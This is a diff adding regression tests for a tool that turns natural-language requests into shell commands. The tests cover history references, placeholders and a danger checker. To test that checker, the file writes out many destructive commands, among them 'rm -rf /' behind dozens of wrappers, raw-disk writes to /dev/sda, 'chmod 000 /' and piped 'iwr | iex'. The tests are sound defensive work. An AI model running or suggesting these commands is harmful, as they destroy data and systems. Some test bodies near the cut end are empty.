+// function words never turn a path into `.`; the Jev teacher and gen_data.js share one exclusion index.
+import { test } from 'node:test';
+import assert from 'node:assert/strict';
+import { readFileSync } from 'node:fs';
+import { suggest } from '../src/pipeline.js';
+// the parser on its own (it only raises risk); the trust rule (a non-catalog command is high) is in regressions27.test.js
+import { assessCommand as checkDanger } from '../src/danger.js';
+import { buildContext, changeGuard } from '../src/history.js';
+import { exclusionIndex } from '../scripts/lib/heldout.js';
+import { EVAL_VALUES } from '../scripts/lib/silver.js';
+// v0.3: commands outside the catalog are high by the allowlist; these cases check the deny rules alone
+const denyOnly = (c, base = 'safe') => checkDanger(c, base, { allowlist: { off: true } });
+
+const BASH = { shell: 'bash', os: 'linux', coreutils: 'gnu' };
+const PWSH = { shell: 'powershell', os: 'win32', coreutils: 'gnu' };
+const run = (q, history, env = BASH) => suggest(q, { env, ...(history ? { history } : {}) });
+const refused = (r, placeholder, why) => {
+  assert.equal(r.context.rule, 'refused', `${why}: ${JSON.stringify(r.context)} -> ${r.command}`);
+  assert.ok(r.command == null || r.command.includes(placeholder), `${why}: ${r.command}`);
+};
+
+test('a changing command is never aimed at the parent directory of a listing or search', () => {
+  for (const [q, h, env] of [
+    // singular "it" too: the listed directory or one of its entries
+    ['delete it', ['ls /tmp/build']], ['delete that folder', ['ls /tmp/build']], ['delete it', ['tree /tmp/build']],
+    ['delete it', ['du /tmp/build']], ['delete it', ['du -h -d 1 /tmp/build | sort -rh']],
+    ['usuń to', ['ls /tmp/build']], ['remove it', ['Get-ChildItem C:\\x'], PWSH],
+    // a search without a path after `cd` searches the cd directory
+    ['delete it', ['cd /tmp/build && grep -rl TODO']], ['delete them', ['cd /tmp/build; rg TODO']],
+    ['delete them', ['cd /tmp/build; fd pdf']], ['delete them', ['cd /tmp/build; find -name "*.o"']],
+    ['delete it', ['pushd /tmp/build; ls']], ['delete it', ['cd /tmp/build; ls -la']],
+    // the cd directory after other commands ran in it
+    ['delete it', ['cd /tmp/build; make']], ['delete it', ['cd /tmp/build && make']],
+  ]) refused(run(q, h, env), '<PATH>', `${q} after ${JSON.stringify(h)}`);
+  for (const [q, h] of [['move it to /tmp/old', ['ls /tmp/build']], ['copy it to /backup', ['cat a.txt', 'ls']]]) {
+    const r = run(q, h);
+    refused(r, '<SRC>', q);
+    assert.ok(!/build|a\.txt/.test(r.command), r.command);
+  }
+  assert.equal(run('make it executable', ['ls scripts']).command, 'chmod +x <FILE>');
+  // the directory itself (not a listing of it) is still a target
+  assert.equal(run('delete it', ['du -sh /tmp/build']).command, 'rm -r /tmp/build');
+  assert.equal(run('delete it', ['mkdir /tmp/new']).command, 'rm -r /tmp/new');
+  assert.equal(run('delete it', ['cd /tmp/build']).command, 'rm -r /tmp/build');
+  // reads are fine
+  assert.equal(run('show it', ['ls /tmp/build']).command, 'ls -lah /tmp/build');
+});
+
+test('a newer listing of the same entity type blocks an older value for a changing command', () => {
+  for (const [q, h, ph] of [
+    ['delete it', ['cat foo.txt; ls'], '<FILE>'],
+    ['delete it', ['cat foo.txt; ls /tmp'], '<PATH>'],
+    ['remove it', ['Get-Content a.txt; Get-ChildItem'], '<FILE>'],
+    ['kill it', ['pgrep foo; ps aux'], '<NAME>'],
+    ['kill that pid', ['kill 1111; pgrep worker'], '<PID>'],
+    ['stop it', ['docker logs web; docker ps'], '<CONTAINER>'],
+    ['restart that service', ['systemctl status nginx; systemctl list-units'], '<SERVICE>'],
+    ['delete that branch', ['git checkout -b feat; git branch'], '<BRANCH>'],
+    // an older line is never read (round 7: one line of history)
+    ['delete it', ['cat foo.txt', 'ls'], '<FILE>'],
+    ['stop it', ['docker logs web', 'docker ps'], '<'],
+  ]) refused(run(q, h), ph, `${q} after ${JSON.stringify(h)}`);
+  // a value printed after the listing (or by it) is fine
+  assert.equal(run('delete it', ['ls; cat foo.txt']).command, 'rm foo.txt');
+  assert.equal(run('kill it', ['ps aux | grep node']).command, 'pkill -f node');
+  assert.equal(run('ubij ten proces', ['top', 'ps -fp 31337']).command, 'kill 31337');
+  assert.equal(run('stop it', ['docker ps; docker logs web']).command, 'docker stop web');
+  // reads may still use the value listed over
+  assert.equal(run('show it', ['cat foo.txt; ls']).command, 'cat foo.txt');
+});
+
+test('only the newest value of a type is a target: no older branch, no hint-selected older path', () => {
+  const b = run('delete that branch', ['git checkout -b feat', 'git checkout main']);
+  refused(b, '<BRANCH>', 'branch');
+  assert.match(b.context.note, /checked-out/);
+  refused(run('delete that backups folder', ['mkdir /srv/remove-backups', 'mkdir /srv/current']), '<PATH>', 'hint');
+  assert.equal(run('delete that branch', ['git push origin feature/x']).command, 'git branch -d feature/x');
+  // only the previous line is read
+  const ctx = buildContext(['mkdir /a', 'mkdir /b']);
+  assert.deepEqual(ctx.ents, { dir: '/b' });
+  assert.equal(changeGuard('dir', '/b', 'delete it', ctx), null);
+  assert.match(changeGuard('dir', '/b', 'delete that backups folder', ctx), /backups/);
+});
+
+test('stale changing commands are never replayed', () => {
+  for (const h of [['rm -r old; ls'], ['rm -r old', 'ls'], ['rm -r old', 'cd /tmp'], ['kill 1111; echo done'], ['tellsh delete folder old', 'ls']]) {
+    for (const q of ['same for /srv/x', 'same but force', 'to samo dla /srv/x']) {
+      const r = run(q, h);
+      assert.ok(r.command == null || !/^(?:rm|kill)\b/.test(r.command) || /<\w+>/.test(r.command), `${q} after ${JSON.stringify(h)} -> ${r.command}`);
+    }
+  }
+  assert.equal(run('same for /srv/x', ['rm -r old']).command, 'rm -r /srv/x');
+});
+
+test('danger: generic -c/--command payloads, trailing commands of wrappers, unsure -> high', () => {
+  for (const c of ['bash -lc "rm -rf /"', 'sh -ec "rm -rf /"', 'script -c "rm -rf /" /dev/null', 'foo --command "rm -rf /"', 'foo --command="rm -rf /"',
+    'env -S "rm -rf /"', 'tmux new "rm -rf /"', 'ssh host rm -rf /', 'ssh -p 22 host "rm -rf /"', 'docker exec ct rm -rf /', 'parallel rm -rf ::: /',
+    'find . -exec sh -c "rm -rf /" \;', 'sudo -iu root rm -rf /', 'sudo --preserve-env=PATH rm -rf /', 'nice --adjustment=5 rm -rf /',
+    'ionice -c3 rm -rf /', 'timeout -s KILL 10 rm -rf /', 'timeout --preserve-status 5 rm -rf /', 'stdbuf -oL rm -rf /', 'nohup rm -rf / &',
+    'setsid -f rm -rf /', 'doas -u root rm -rf /', 'env -i FOO=1 rm -rf /', 'xargs -0 -I{} rm -rf /', 'flock -w 5 /tmp/l rm -rf /',
+    'eatmydata rm -rf /', 'catchsegv rm -rf /', 'proxychains rm -rf /', 'faketime "2020-01-01" rm -rf /', 'su -lc "rm -rf /" root',
+    'runuser -l root -c "rm -rf /"', 'pkexec --user root rm -rf /', 'chrt -f 99 rm -rf /', 'cgexec -g cpu:x rm -rf /', 'torsocks rm -rf /',
+    'cmd /c rd /s /q C:\\', 'powershell -Command Remove-Item -Recurse C:\\']) {
+    const d = checkDanger(c);
+    assert.equal(d.risk, 'high', c);
+    assert.equal(d.critical, true, `${c}: ${d.warnings.join('; ')}`);
+  }
+  // cannot be checked: high
+  for (const c of ['$CMD -rf /', 'eval "$X"', 'sh -c "$X"', 'su -c "$CMD"', 'echo "rm -rf /" | sh', 'cat script | sudo bash',
+    'powershell -EncodedCommand AAAA', 'iwr x | iex', '$(which rm) -rf /tmp/x', 'find . -exec sh -c "rm \\"$1\\"" _ {} \;']) {
+    assert.equal(checkDanger(c).risk, 'high', c);
+  }
+  // inline interpreter code is not shell and cannot be checked (round 5: unsure -> high)
+  assert.equal(checkDanger('python3 -c "print(1)"').risk, 'high');
+  // privilege change: at least medium
+  for (const c of ['su - bob', 'sudo -u bob ls', 'pkexec ls', 'runuser -u bob ls']) assert.notEqual(checkDanger(c).risk, 'safe', c);
+  // unchanged: ordinary -c options and wrapped harmless commands
+  for (const c of ['grep -c foo file', 'grep -c "$PAT" file', 'wc -c file', 'head -c 10 f', 'ssh user@host', 'ssh -p 22 host uptime',
+    'docker exec -it web sh', 'tar -czvf a.tgz dir', 'timeout 5 ping -c 3 x.org',
+    'watch -n 1 df -h', 'xargs -n1 echo', 'ls | shuf', 'ls | sha256sum', 'tmux new -s work', 'kubectl exec -it pod -- ls /']) {
+    assert.equal(denyOnly(c).risk, 'safe', `${c}: ${denyOnly(c).warnings.join('; ')}`);
+  }
+  // a script of the project: medium (v0.3 close4)
+  for (const c of ['nohup node server.js &', 'nice -n 10 make']) assert.equal(denyOnly(c).risk, 'medium', c);
+});
+
+test('a function word never turns a path into `.`: placeholder instead', () => {
+  for (const q of ['list files in the', 'list files in out', 'list files in', 'pokaż pliki w', 'find log files in the', 'list files in it']) {
+    const r = run(q);
+    if (!r.understood && !r.command) continue; // a rejection is fine too (v0.4 model); never `.`
+    assert.ok(r.command?.includes('<PATH>'), `${q} -> ${r.command}`);
+    assert.ok(!/ \.(?:\s|$)/.test(r.command), `${q} -> ${r.command}`);
+  }
+  // with history, "in it" is a reference; "in the" is not filled implicitly
+  assert.equal(run('list everything in it', ['cd /tmp/x']).command, 'ls -lah /tmp/x');
+  assert.match(run('list files in the', ['cd /tmp/x']).command, /<PATH>/);
+  // unchanged: a real location word or no location at all
+  assert.equal(run('list files').command, 'ls -lah .');
+  assert.equal(run('list all files in the current directory').command, 'ls -lah .');
+  assert.equal(run('delete the folder out').command, 'rm -r out');
+});
+
+test('the Jev teacher uses the exclusion index of gen_data.js, including eval-only values', () => {
+  const root = new URL('..', import.meta.url).pathname;
+  const idx = exclusionIndex(root);
+  const v = EVAL_VALUES.find((x) => /^[\w./-]{4,}$/.test(x));
+  assert.ok(idx.has(`show the contents of ${v}`), v);
+  assert.ok(idx.evalValue(`show the contents of ${v}`));
+  for (const f of ['scripts/teacher.js', 'scripts/gen_data.js']) {
+    const src = readFileSync(new URL(`../${f}`, import.meta.url), 'utf8');
+    assert.match(src, /exclusionIndex\(ROOT\)/, f);
+    assert.doesNotMatch(src, /heldOutIndex\(heldOutTexts/, f);
+  }
+});
+
+test('a reference in destination position is the destination, under the same guard', () => {
+  assert.equal(run('copy notes.txt to it', ['mkdir /backup']).command, 'cp -ri notes.txt /backup');
+  assert.equal(run('skopiuj notes.txt do niego', ['mkdir /backup']).command, 'cp -ri notes.txt /backup');
+  assert.equal(run('move report.pdf into that folder', ['mkdir /srv/x']).command, 'mv -i report.pdf /srv/x');
+  // a listed directory (or anything else changeGuard rejects) is not a destination either
+  for (const q of ['copy notes.txt to it', 'copy notes.txt into that folder']) {
+    const r = run(q, ['ls /backup']);
+    assert.equal(r.command, 'cp -ri notes.txt <DST>', q);
+    assert.equal(r.context.rule, 'refused');
+  }
+  // the reference as the source is unchanged
+  assert.equal(run('move it to /tmp/old', ['cat a.txt']).command, 'mv -i a.txt /tmp/old');
+  assert.equal(run('copy them to /backup', ['ls /x | grep pdf']).command, 'cp -ri <SRC> /backup');
+});
diff --git a/test/regressions7.test.js b/test/regressions7.test.js
new file mode 100644
index 0000000..bc6d6a9
--- /dev/null
+++ b/test/regressions7.test.js
@@ -0,0 +1,147 @@
+// Regression tests for the round-5 fixes (review/r5-claude.md, review/r5-codex.md): place references ("there", "tam",
+// "in the same folder") go through the history guard and never fall back to `.`; rejected paths never become `.`;
+// "move them to X" never makes X the source; "everything in it" never deletes the directory itself; earlier
+// `tellsh` requests keep their placeholders when they are read back from history; "same but" never refills a
+// withheld slot; wrapped listings (`sudo -u root ls`) protect older values; the danger checker reads inline
+// interpreter code, non-recursive chmod/chown of /, writes onto raw disks and destructive commands after unknown programs.
+import { test } from 'node:test';
+import assert from 'node:assert/strict';
+import { suggest } from '../src/pipeline.js';
+// the parser on its own (it only raises risk); the trust rule (a non-catalog command is high) is in regressions27.test.js
+import { assessCommand as checkDanger } from '../src/danger.js';
+// v0.3: commands outside the catalog are high by the allowlist; these cases check the deny rules alone
+const denyOnly = (c, base = 'safe') => checkDanger(c, base, { allowlist: { off: true } });
+
+const BASH = { shell: 'bash', os: 'linux', coreutils: 'gnu' };
+const run = (q, history) => suggest(q, { env: BASH, ...(history ? { history } : {}) });
+const placeholder = (r, ph, why) => {
+  assert.ok(r.command == null || r.command.includes(ph), `${why}: ${r.command}`);
+  assert.ok(r.command == null || !/ \.(?:\s|$)/.test(r.command), `${why}: ${r.command}`);
+};
+
+test('"there", "tam", "stamtąd", "inside", "in the same folder" are place references, never `.`', () => {
+  // claude r5 blocker: with history, the listed directory is not a target for a changing command
+  for (const [q, h] of [
+    ['delete all log files there', ['ls /var/log']], ['delete all log files there', ['cd /var/log', 'ls']],
+    ['delete all .tmp files over there', ['ls /var/log']], ['delete all log files inside', ['ls /var/log']],
+    ['usuń wszystkie pliki log tam', ['ls /var/log']], ['usuń wszystkie pliki log stamtąd', ['ls /var/log']],
+    // a cd after which other commands ran, no directory at all, a newer file
+    ['delete all log files there', ['cd /tmp/x', 'make']], ['delete all log files there', ['cat /etc/hosts']],
+    ['delete all log files there', ['cd /tmp/x', 'cat a.txt']],
+  ]) {
+    const r = run(q, h);
+    assert.equal(r.context.rule, 'refused', `${q} after ${h}: ${JSON.stringify(r.context)}`);
+    placeholder(r, '<PATH>', `${q} after ${h}`);
+  }
+  // claude r5 minor 2 and no history: placeholder, never `find there` / `find same` / `find .`
+  for (const q of ['delete all log files there', 'delete all log files in there', 'delete all log files from there',
+    'delete all log files in the same folder', 'delete all log files in the same place', 'remove the logs in there too',
+    'usuń wszystkie pliki log tam', 'list files there']) {
+    const r = run(q);
+    placeholder(r, '<PATH>', q);
+    assert.ok(!/\b(?:there|same|tam)\b/.test(r.command), `${q}: ${r.command}`);
+  }
+  // a place never names the object of a changing command
+  for (const q of ['remove the logs in there too', 'delete the folder there', 'delete notes.txt there']) {
+    const r = run(q, ['cd /tmp/x']);
+    assert.ok(!r.command.includes('/tmp/x'), `${q}: ${r.command}`);
+    assert.equal(r.context.rule, 'refused', q);
+  }
+  // the newest directory, unambiguous and from the most recent segment: a search root (or a destination) is fine
+  assert.equal(run('delete all log files there', ['cd /tmp']).command, "find /tmp -type f -iname '*.log' -delete");
+  assert.equal(run('find files named foo there', ['cd /tmp/x']).command, "find /tmp/x -iname '*foo*'");
+  assert.equal(run('copy notes.txt there', ['cd /tmp/x']).command, 'cp -ri notes.txt /tmp/x');
+  assert.equal(run('copy notes.txt there', ['ls /tmp/x']).command, 'cp -ri notes.txt <DST>');
+  // reads may use a listed directory
+  assert.equal(run('list files there', ['ls /var/log']).command, 'ls -lah /var/log');
+  // existential "there" is not a reference
+  assert.equal(run('is there a file named foo').command, "find . -iname '*foo*'");
+});
+
+test('a rejected explicit path is withheld, never replaced by `.` (codex r5 major 4)', () => {
+  for (const q of ['delete all log files in "/tmp/a\nb"', 'list files in "/tmp/a\nb"']) placeholder(run(q), '<PATH>', JSON.stringify(q));
+});
+
+test('"move them to X" / "copy them to X": X is the destination, the source a placeholder (claude r5 minor 3)', () => {
+  for (const [q, h, cmd] of [
+    ['move them to /tmp/old', null, 'mv -i <SRC> /tmp/old'], ['move them to /tmp/old', ['ls'], 'mv -i <SRC> /tmp/old'],
+    ['move them to /tmp/old', ['ls *.pdf'], 'mv -i <SRC> /tmp/old'], ['move them to /tmp/old', ['ls | grep pdf'], 'mv -i <SRC> /tmp/old'],
+    ['move them to /tmp/old', ['echo hi'], 'mv -i <SRC> /tmp/old'], ['copy them to /backup', null, 'cp -ri <SRC> /backup'],
+    ['przenieś je do /tmp/old', null, 'mv -i <SRC> /tmp/old'],
+  ]) assert.equal(run(q, h).command, cmd, `${q} after ${h}`);
+  // two named paths, or a resolved reference: unchanged
+  assert.equal(run('copy notes.txt to /backup').command, 'cp -ri notes.txt /backup');
+  assert.equal(run('rename a.txt to b.txt').command, 'mv -i a.txt b.txt');
+  assert.equal(run('copy it to /backup', ['cat a.txt']).command, 'cp -ri a.txt /backup');
+  assert.equal(run('copy notes.txt to it', ['mkdir /tmp/n']).command, 'cp -ri notes.txt /tmp/n');
+});
+
+test('"delete everything in it" is about the entries, never the directory itself (claude r5 minor 4)', () => {
+  for (const q of ['delete everything in it', 'usuń wszystko w nim', 'remove all the contents of it']) {
+    const r = run(q, ['cd /tmp/build']);
+    assert.ok(!r.command?.includes('/tmp/build'), `${q}: ${r.command}`);
+  }
+  assert.equal(run('delete it', ['cd /tmp/build']).command, 'rm -r /tmp/build');
+});
+
+test('an earlier tellsh request keeps its placeholders when read back from history (codex r5 blocker)', () => {
+  for (const [q, h, ph] of [
+    ['same for txt', ['tellsh delete all log files in the'], '<PATH>'],
+    ['delete it', ['tellsh delete folder /tmp/data!'], '<PATH>'],
+    ['same for txt', ['tellsh delete all log files there'], '<PATH>'],
+  ]) {
+    const r = run(q, h);
+    assert.equal(r.context.rule, 'refused', `${q} after ${h}: ${r.command}`);
+    placeholder(r, ph, `${q} after ${h}`);
+  }
+  // values the earlier request did read are still used
+  assert.equal(run('same for /tmp/b', ['tellsh list files in /tmp/a']).command, 'ls -lah /tmp/b');
+  assert.equal(run('delete it', ['tellsh show file notes.txt']).command, 'rm notes.txt');
+});
+
+test('"same but" never refills a slot the request withheld (codex r5 major 2)', () => {
+  const r = run('same but delete txt files in /tmp/new!', ['find /srv/old -type f -iname "*.log" -delete']);
+  assert.ok(!r.command.includes('/srv/old'), r.command);
+  assert.ok(r.command.includes('<PATH>') && r.missing.includes('path'), r.command);
+});
+
+test('a wrapped listing protects older values like a plain one (codex r5 major 3)', () => {
+  for (const [q, h, ph] of [
+    ['delete it', ['cat old.txt; sudo -u root ls'], '<FILE>'], ['kill that pid', ['kill 1111; sudo -u root ps aux'], '<PID>'],
+    ['stop it', ['docker logs old; sudo -u root docker ps'], '<CONTAINER>'], ['delete it', ['cat old.txt; env ls'], '<FILE>'],
+    ['delete it', ['cat old.txt; command ls'], '<FILE>'], ['delete it', ['cat old.txt; nice -n 5 ls'], '<FILE>'],
+    ['delete it', ['cat old.txt; timeout 5 ls'], '<FILE>'], ['delete it', ['cat old.txt; sudo -iu root ls'], '<FILE>'],
+    // a wrapper whose arguments cannot be read: unknown, refuse
+    ['delete it', ['cat old.txt; sudo -u'], '<FILE>'],
+    // and in their own line (only the previous line is read)
+    ['delete it', ['cat old.txt', 'sudo -u root ls'], '<FILE>'], ['delete it', ['cat old.txt', 'sudo -u'], '<FILE>'],
+  ]) {
+    const r = run(q, h);
+    assert.equal(r.context.rule, 'refused', `${q} after ${h}: ${r.command}`);
+    assert.ok(r.command.includes(ph), `${q} after ${h}: ${r.command}`);
+  }
+  // a wrapped command still names its own target
+  assert.equal(run('delete it', ['sudo -u root cat new.txt']).command, 'rm new.txt');
+  assert.equal(run('kill it', ['sudo kill 4242']).command, 'kill 4242');
+});
+
+test('danger: inline interpreter code, chmod/chown of /, raw disk writes, unknown wrappers (claude r5 minor 5)', () => {
+  for (const c of ['perl -e "system(q{rm -rf /})"', `python3 -c "import shutil; shutil.rmtree('/')"`, `ruby -e 'system("rm -rf /")'`,
+    `awk 'BEGIN{system("rm -rf /")}'`, `node -e "require('fs').rmSync('/',{recursive:true})"`, 'chmod 000 /', 'chmod 000 /etc',
+    'chown nobody /', 'cat x | sudo tee /dev/sda', 'cp disk.img /dev/nvme0n1', 'unknownwrapper rm -rf /', 'mywrap -x rm -rf ~']) {
+    const d = checkDanger(c);
+    assert.equal(d.risk, 'high', c);
+    assert.ok(d.critical, `${c}: ${d.warnings.join('; ')}`);
+  }
+  // inline code that cannot be checked is high, not critical
+  for (const c of ['python3 -c "print(1)"', 'node -e "1"', 'perl -ne "print if /x/" f', 'chmod 644 /etc/hosts', 'chmod 700 ~']) {
+    const d = checkDanger(c);
+    assert.equal(d.risk, 'high', c);
+    assert.ok(!d.critical, c);
+  }
+  // unchanged
+  for (const c of ['awk "{print $1}" f', 'chmod +x script.sh', 'chmod 755 ./x', 'grep -r rm src', 'man rm', 'echo rm -rf /']) {
+    assert.equal(denyOnly(c).risk, 'safe', `${c}: ${denyOnly(c).warnings.join('; ')}`);
+  }  // a script of the project: medium (v0.3 close4)
+  assert.equal(denyOnly('python3 script.py').risk, 'medium');
+});
diff --git a/test/regressions8.test.js b/test/regressions8.test.js
new file mode 100644
index 0000000..cb6f629
--- /dev/null
+++ b/test/regressions8.test.js
@@ -0,0 +1,204 @@
+// Regression tests for round 7: history references read only the single most recent command, and the round-6
+// findings (review/r6-claude.md, review/r6-codex.md): quoted paths with spaces keep their boundaries, invalid history
+// values and refused references never fall back to `.`, more place references, "its contents", global options of
+// git/docker before a listing, "move it there", several paths for one slot, command substitution, danger-checker gaps
+// (here-strings, `sh -c … _ /`, truncating system files) and NUL bytes.
+import { test } from 'node:test';
+import assert from 'node:assert/strict';
+import { spawnSync } from 'node:child_process';
+import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+import { fileURLToPath } from 'node:url';
+import { suggest } from '../src/pipeline.js';
+// the parser on its own (it only raises risk); the trust rule (a non-catalog command is high) is in regressions27.test.js
+import { assessCommand as checkDanger } from '../src/danger.js';
+import { buildContext, tellshQuery, loadHistory } from '../src/history.js';
+import { joinWords } from '../src/shellwords.js';
+import { validateComposed } from '../src/compose.js';
+
+const BASH = { shell: 'bash', os: 'linux', coreutils: 'gnu' };
+const run = (q, history) => suggest(q, { env: BASH, ...(history ? { history } : {}) });
+const BIN = fileURLToPath(new URL('../bin/tellsh.js', import.meta.url));
+const cli = (args) => spawnSync(process.execPath, [BIN, ...args], { encoding: 'utf8', env: { ...process.env, NO_COLOR: '1' } });
+const refused = (r, ph, why) => {
+  assert.equal(r.context.rule, 'refused', `${why}: ${JSON.stringify(r.context)} -> ${r.command}`);
+  assert.ok(r.command == null || r.command.includes(ph), `${why}: ${r.command}`);
+};
+
+test('only the most recent history line is a reference target', () => {
+  // the value two lines back is never used, for reads or changes
+  for (const [q, h, ph] of [
+    ['delete it', ['cat notes.txt', 'ls'], '<FILE>'],
+    ['show it', ['cat notes.txt', 'pwd'], '<'],
+    ['logs of that container', ['docker run -d --name web nginx', 'git status'], '<CONTAINER>'],
+    ['restart that service', ['systemctl status nginx', 'uptime'], '<SERVICE>'],
+    ['delete that branch', ['git checkout -b feature/x', 'git log -n 3'], '<BRANCH>'],
+    ['kill it', ['pgrep worker', 'echo done'], '<'],
+  ]) {
+    const r = run(q, h);
+    refused(r, ph, `${q} after ${JSON.stringify(h)}`);
+    assert.ok(!/notes|web|nginx|feature|worker/.test(r.command ?? ''), `${q}: ${r.command}`);
+  }
+  // the previous command itself is used
+  assert.equal(run('delete it', ['ls', 'cat notes.txt']).command, 'rm notes.txt');
+  assert.equal(run('logs of that container', ['git status', 'docker run -d --name web nginx']).command, 'docker logs --tail 100 -f web');
+  // "same for" / "same but" repeat only the previous command
+  for (const q of ['same for /var', 'same but only file names', 'to samo dla /var']) {
+    const r = run(q, ['du -sh /home', 'ls']);
+    assert.equal(r.command, null, q);
+    assert.equal(r.context.rule, 'refused', q);
+  }
+  assert.equal(run('same for /var', ['ls', 'du -sh /home']).command, 'du -sh /var');
+  // the context holds one line
+  const ctx = buildContext(['cat a.txt', 'docker logs web', 'mkdir /tmp/b']);
+  assert.equal(ctx.n, 1);
+  assert.deepEqual(ctx.ents, { dir: '/tmp/b' });
+  assert.equal(buildContext([]).n, 0);
+});
+
+test('the running tellsh call is dropped once, then the previous command is the target', () => {
+  assert.equal(run('delete it', ['cat a.txt', 'tellsh --history delete it']).command, 'rm a.txt');
+  // the same request run twice: the earlier call is the previous command (and names nothing)
+  const r = run('delete it', ['cat a.txt', 'tellsh delete it', 'tellsh delete it']);
+  assert.ok(!/a\.txt/.test(r.command ?? ''), r.command);
+  // the CLI reads the last two lines only
+  const dir = mkdtempSync(join(tmpdir(), 'tellsh-r7-'));
+  try {
+    const f = join(dir, 'hist');
+    writeFileSync(f, 'cat old.txt\nls\ncat new.txt\n');
+    assert.deepEqual([...loadHistory({ file: f })], ['ls', 'cat new.txt']);
+    const out = cli(['--dry-run', `--history=${f}`, '--shell', 'bash', '--os', 'linux', 'delete', 'it']);
+    assert.match(out.stdout, /\$ rm new\.txt/);
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('blocker: a quoted path with a space keeps its boundaries (CLI argv and earlier tellsh lines)', () => {
+  assert.equal(joinWords(['delete', 'folder', '/tmp/a b']), 'delete folder "/tmp/a b"');
+  assert.equal(joinWords(['delete folder /tmp/x']), 'delete folder /tmp/x'); // one argument: the whole request
+  assert.equal(joinWords(['x', `a "b" 'c'`]), null);
+  const d = cli(['--json', '--shell', 'bash', '--os', 'linux', 'delete', 'folder', '/tmp/a b']);
+  assert.equal(JSON.parse(d.stdout).command, "rm -r '/tmp/a b'");
+  const f = cli(['--json', '--shell', 'bash', '--os', 'linux', 'delete', 'all', 'log', 'files', 'in', '/tmp/my logs']);
+  assert.equal(JSON.parse(f.stdout).command, "find '/tmp/my logs' -type f -iname '*.log' -delete");
+  // a whole request in one argument is unchanged
+  assert.equal(JSON.parse(cli(['--json', '--shell', 'bash', '--os', 'linux', 'zabij proces na porcie 8080']).stdout).command, 'lsof -ti tcp:8080 -sTCP:LISTEN | xargs -r kill');
+  // history: the tellsh line is read with its quoting
+  assert.equal(tellshQuery('tellsh show folder "/tmp/my data"'), 'show folder "/tmp/my data"');
+  assert.equal(tellshQuery("tellsh --shell bash delete folder '/tmp/a b'"), 'delete folder "/tmp/a b"');
+  assert.equal(tellshQuery(`tellsh x "a \\"b\\" 'c'"`), false);
+  for (const [h, q, exp] of [
+    ['tellsh show folder "/tmp/my data"', 'delete it', "rm -r '/tmp/my data'"],
+    ['tellsh delete folder "/tmp/a b"', 'delete it', "rm -r '/tmp/a b'"],
+    ['tellsh delete all log files in "/tmp/a b"', 'same for txt', "find '/tmp/a b' -type f -iname '*.txt' -delete"],
+  ]) assert.equal(run(q, [h]).command, exp, `${q} after ${h}`);
+  // an earlier request that cannot be read back is a refusal, never a guess
+  const u = run('delete it', [`tellsh x "a \\"b\\" 'c'"`]);
+  refused(u, '<', 'unreadable tellsh line');
+});
+
+test('blocker: an invalid history value is a placeholder, never the default `.`', () => {
+  const long = '/srv/' + 'segment/'.repeat(32) + 'logs';
+  const a = run(`same for ${long}`, ['find /srv/old -type f -iname "*.log" -delete']);
+  assert.equal(a.command, "find <PATH> -type f -iname '*.log' -delete");
+  assert.ok(a.missing.includes('path'));
+  const b = run('same but delete txt files', [`find ${long} -type f -iname "*.log" -delete`]);
+  assert.equal(b.command, "find <PATH> -type f -iname '*.txt' -delete");
+  assert.equal(b.context.rule, 'refused');
+  const c = run('delete it', [`mkdir ${long}`]);
+  assert.ok(!/\s\.$/.test(c.command) && c.command.includes('<PATH>'), c.command);
+});
+
+test('major: a refused reference never leaves `rm -r .`; a request about entries keeps its intent', () => {
+  for (const h of [['ls /var/log'], ['cd /tmp/x; make']]) {
+    for (const q of ['delete all log files in this folder', 'delete log files in this folder']) {
+      const r = run(q, h);
+      refused(r, '<PATH>', `${q} after ${h}`);
+      assert.match(r.command, /^find <PATH> /, r.command);
+    }
+  }
+  // without history the request is about the working directory
+  assert.equal(run('delete all log files in this folder').command, "find . -type f -iname '*.log' -delete");
+});
+
+test('major: other wordings of the previous directory are place references', () => {
+  for (const q of ['delete all log files in the previous folder', 'delete all log files in the last directory',
+    'delete all log files in the directory I listed', 'usuń pliki log w poprzednim katalogu']) {
+    const listed = run(q, ['ls /var/log']);
+    refused(listed, '<PATH>', `${q} after ls`);
+    assert.ok(!/poprzednim|\s\.\s/.test(listed.command), listed.command);

+  }
+  assert.equal(run('delete all log files in the previous folder', ['cd /tmp/x']).command, "find /tmp/x -type f -iname '*.log' -delete");
+  // a path named next to a place word is withheld, with or without history
+  for (const h of [undefined, ['cd /tmp/x']]) assert.equal(run('delete notes.txt there', h).command, 'rm <FILE>');
+  // not references
+  assert.equal(run('show the last modified files').command.includes('<PATH>'), false);
+});
+
+test('major: global options of git/docker do not hide a listing in the line', () => {
+  refused(run('delete it', ['cat old.txt; git -C /tmp status']), '<FILE>', 'git -C');
+  refused(run('stop it', ['docker logs old; docker --context prod ps']), '<CONTAINER>', 'docker --context');
+  refused(run('stop it', ['docker logs old; docker -H tcp://h:2375 ps']), '<CONTAINER>', 'docker -H');
+  // the values themselves belong to that context (round 9): see regressions10 'scope-changing global options'
+  refused(run('stop it', ['docker --context prod logs web']), '<CONTAINER>', 'docker --context logs');
+  refused(run('delete that branch', ['git -C /srv/app merge feature/x']), '<BRANCH>', 'git -C merge');
+});
+
+test('minor: "its contents", "what is in it", "usuń jego zawartość" are not the directory', () => {
+  for (const q of ['delete its contents', 'delete what is in it', 'usuń jego zawartość', 'remove the contents of it', 'delete its files']) {
+    const r = run(q, ['cd /tmp/build']);
+    refused(r, '<PATH>', q);

+  }
+  assert.equal(run('delete it', ['cd /tmp/build']).command, 'rm -r /tmp/build');
+});
+
+test('minor: "move it there" names both ends by reference and is refused', () => {
+  for (const q of ['move it there', 'move that file there', 'copy it to the previous folder']) {

+  }

+});
+
+test('minor: several paths for one slot and command substitution are placeholders', () => {
+  const m = run('delete all log files in "/tmp/x" and "/tmp/y"');
+  assert.equal(m.command, "find <PATH> -type f -iname '*.log' -delete");
+  assert.ok(m.warnings.some((w) => /more paths/.test(w)), m.warnings.join('; '));
+  assert.equal(run('delete all log files in /tmp/x and /tmp/y').command, "find <PATH> -type f -iname '*.log' -delete");
+  for (const q of ['delete all log files in `pwd`', 'delete all log files in $(pwd)']) {

+  }

+  assert.equal(run('move /tmp/a.txt to /tmp/b.txt').command, 'mv -i /tmp/a.txt /tmp/b.txt');
+  assert.equal(run('delete all log files in /tmp/x').command, "find /tmp/x -type f -iname '*.log' -delete");
+});
+
+test('minor: danger checker: here-strings, sh -c with positional arguments, truncating system files', () => {
